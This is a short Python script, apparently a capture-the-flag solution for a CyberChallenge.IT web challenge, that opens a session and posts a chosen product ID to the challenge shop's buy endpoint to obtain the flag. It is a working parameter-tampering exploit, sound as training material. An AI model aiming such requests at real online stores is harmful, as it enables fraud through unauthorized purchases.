#!/bin/python3
import requests

s = requests.session()

flag_product_id = '43d27d66-150b-4b41-a1ee-6c3e02c0a67c'
s.get('http://yasc.challs.cyberchallenge.it/')

page = s.post('http://yasc.challs.cyberchallenge.it/buy', data={'product_id': flag_product_id}).text.split('\n')

for i in page:
    if 'CCIT' in i:
        print(i)
        break